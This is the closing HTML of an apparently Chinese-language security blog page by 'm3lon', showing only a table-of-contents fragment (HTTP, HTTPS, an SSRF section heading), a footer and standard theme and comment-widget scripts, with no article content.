href="#响应报文"><span class="nav-number">7.1.2.</span> <span class="nav-text">响应报文</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-https协议"><span class="nav-number">7.2.</span> <span class="nav-text">2. https协议</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-SSRF"><span class="nav-number">8.</span> <span class="nav-text">0x08 SSRF</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">m3lon</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  
    <script type="text/javascript">
      (function(d, s) {
        var j, e = d.getElementsByTagName(s)[0];
        if (typeof LivereTower === 'function') { return; }
        j = d.createElement(s);
        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
        j.async = true;
        e.parentNode.insertBefore(j, e);
      })(document, 'script');
    </script>
  












  





  

  

  

  
  

  

  

  

</body>
</html>
